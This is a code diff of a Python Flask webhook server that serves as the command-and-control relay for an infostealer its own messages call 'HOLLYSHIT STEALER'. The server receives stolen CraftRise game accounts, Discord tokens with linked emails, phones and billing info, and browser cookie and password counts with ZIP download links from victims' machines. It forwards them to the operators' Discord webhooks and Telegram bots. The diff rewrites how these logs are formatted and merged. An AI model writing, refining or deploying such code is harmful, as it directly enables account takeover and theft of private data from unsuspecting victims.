@@ -18,17 +18,17 @@ CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
 CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
 CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
 MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
-MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")  # YENI
-MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")  # YENI
+MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
+MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")
 
-def send_discord(url, data):
+def send_discord(url, content, embeds=None):
     if not url:
         return
     try:
-        if isinstance(data, str):
-            requests.post(url, json={"content": data}, timeout=30)
-        else:
-            requests.post(url, json=data, timeout=30)
+        payload = {"content": content}
+        if embeds:
+            payload["embeds"] = embeds
+        requests.post(url, json=payload, timeout=30)
     except Exception as e:
         print(f"Discord hatası: {e}")
 
@@ -36,7 +36,7 @@ def send_telegram(token, chat_id, msg):
     if token and chat_id and msg:
         try:
             requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
-                         json={"chat_id": chat_id, "text": msg, "parse_mode": "Markdown"}, timeout=30)
+                         json={"chat_id": chat_id, "text": msg}, timeout=30)
         except:
             pass
 
@@ -45,70 +45,67 @@ def webhook():
     try:
         data = request.get_json()
         log_type = data.get("type", "unknown")
+        payload = data.get("data", data)
         
         print(f"[{datetime.now()}] Type: {log_type}")
         
-        # ============ CRAFTRISE ============
+        # ============ CRAFTRISE (Sadece CraftRise hesabı) ============
         if log_type == "craftrise":
-            payload = data.get("data", data)
-            send_discord(CRAFTRISE_WEBHOOK, payload)
+            content = payload.get("content", str(payload))
+            send_discord(CRAFTRISE_WEBHOOK, content)
             
-            if CRAFTRISE_TELEGRAM_TOKEN and CRAFTRISE_TELEGRAM_CHAT_ID:
-                content = payload.get("content", "")
-                match = re.search(r'`([^`]+)`', content)
-                if match:
-                    tg_msg = f"🎮 **CraftRise Hesabı!**\n```\n{match.group(1)}\n```"
-                else:
-                    tg_msg = content
+            # Telegram için sadece hesap bilgisi
+            match = re.search(r'`([^`]+)`', content)
+            if match:
+                tg_msg = f"🎮 CraftRise Hesabı!\n```\n{match.group(1)}\n```"
                 send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
         
-        # ============ DISCORD TOKEN ============
+        # ============ DISCORD TOKEN (Sadece token) ============
         elif log_type == "discord":
-            payload = data.get("data", data)
-            send_discord(DISCORD_WEBHOOK, payload)
-            
-            if DISCORD_TELEGRAM_TOKEN and DISCORD_TELEGRAM_CHAT_ID:
-                content = payload.get("content", "")
-                user_match = re.search(r'\*\*User:\*\* `([^`]+)`', content)
-                token_match = re.search(r'\*\*Token:\*\* `([^`]+)`', content)
-                if user_match and token_match:
-                    tg_msg = f"💎 **Discord Token!**\n👤 **User:** {user_match.group(1)}\n🔑 **Token:** `{token_match.group(1)[:30]}...`"
-                else:
-                    tg_msg = content[:500]
-                send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, tg_msg)
+            content = payload.get("content", str(payload))
+            send_discord(DISCORD_WEBHOOK, content)
+            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, content[:500])
         
-        # ============ BROWSER (Tarayıcı verileri) ============
-        elif log_type == "browser":
-            payload = data.get("data", data)
-            
-            # Discord'a gönder (master webhook)
-            browser_msg = f"🕸️ **Tarayıcı Verileri Çalındı!**\n\n📊 **İstatistikler:**\n• Toplam çerez: {payload.get('cookies', 0)}\n• Toplam şifre: {payload.get('passwords', 0)}\n• Toplam otomatik doldurma: {payload.get('autofill', 0)}"
-            
-            # Zip linki varsa ekle
-            if payload.get('download_url'):
-                browser_msg += f"\n\n📥 **Download:** {payload['download_url']}"
-            
-            send_discord(MASTER_WEBHOOK, browser_msg)
-            
-            # Telegram'a da gönder
-            if MASTER_TELEGRAM_TOKEN and MASTER_TELEGRAM_CHAT_ID:
-                tg_msg = f"🕸️ *Tarayıcı Verileri Çalındı!*\n\n📊 İstatistikler:\n• Çerez: {payload.get('cookies', 0)}\n• Şifre: {payload.get('passwords', 0)}"
-                if payload.get('download_url'):
-                    tg_msg += f"\n\n📥 Download: {payload['download_url']}"
-                send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg)
-        
-        # ============ GLOBAL / SUMMARY ============
+        # ============ BROWSER / GLOBAL (HER ŞEY TEK MESAJDA) ============
         else:
-            payload = data.get("data", data)
+            # Payload'dan verileri çek
+            username = payload.get("username", "Unknown")
+            hostname = payload.get("hostname", "Unknown")
+            craftrise = payload.get("craftrise", "None")
+            token_info = payload.get("first_token", {})
+            download_url = payload.get("download_url", "")
+            cookies = payload.get("cookies", 0)
+            passwords = payload.get("passwords", 0)
             
-            # Özet bilgi
-            if isinstance(payload, dict) and "token_count" in payload:
-                msg = f"📊 **Steal Summary!**\n```\n👤 User: {payload.get('sys_info', {}).get('username', 'Unknown')}\n💻 Host: {payload.get('sys_info', {}).get('hostname', 'Unknown')}\n🔑 Token Sayısı: {payload.get('token_count', 0)}\n🎮 CraftRise: {payload.get('craftrise', 'None')}\n```"
-            else:
-                msg = f"📦 **New Data!**\n```json\n{json.dumps(payload, indent=2)[:1000]}\n```"
+            # Discord mesajını oluştur
+            msg = f"@everyone `{username}` - `{hostname}`\n🎮 **CraftRise:** `{craftrise}`\n\n"
             
-            send_discord(WEBHOOK, msg)
-            send_telegram(TELEGRAM_TOKEN, TELEGRAM_CHAT_ID, msg)
+            if token_info:
+                msg += f"**{token_info.get('user', 'Unknown')} ({token_info.get('id', 'ID')})**\n"
+                msg += f"- 🔑 **Token:** `{token_info.get('token', 'None')[:50]}...`\n"
+                msg += f"- 👤 **Username:** {token_info.get('user', 'Unknown')}\n"
+                msg += f"- 🎖️ **Badges:** {token_info.get('badges', 'None')}\n"
+                msg += f"- 💳 **Billings:** {token_info.get('billing', 'None')}\n"
+                msg += f"- 📧 **Email:** {token_info.get('email', 'None')}\n"
+                msg += f"- 📱 **Phone:** {token_info.get('phone', 'None')}\n\n"
+            
+            msg += f"📊 **Analysis Stats**\n- 🍪 **Cookies:** {cookies}\n- 🔑 **Passwords:** {passwords}\n"
+            
+            if download_url:
+                msg += f"\n📥 **Download:** [Click Here to Download ZIP]({download_url})"
+            
+            # Discord'a gönder (Master webhook)
+            send_discord(MASTER_WEBHOOK, msg)
+            
+            # Telegram'a da gönder (düz metin, markdown yok)
+            tg_msg = f"🕸️ HOLLYSHIT STEALER\n\n👤 Kullanıcı: {username}\n💻 Bilgisayar: {hostname}\n🎮 CraftRise: {craftrise}\n\n"
+            if token_info:
+                tg_msg += f"📌 Discord Token:\n👤 {token_info.get('user', 'Unknown')}\n📧 {token_info.get('email', 'None')}\n🔑 {token_info.get('token', 'None')[:40]}...\n\n"
+            tg_msg += f"📊 İstatistikler:\n🍪 Çerez: {cookies}\n🔑 Şifre: {passwords}\n"
+            if download_url:
+                tg_msg += f"\n📥 ZIP İndir: {download_url}"
+            
+            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg)
         
         return jsonify({"status": "ok"}), 200
         
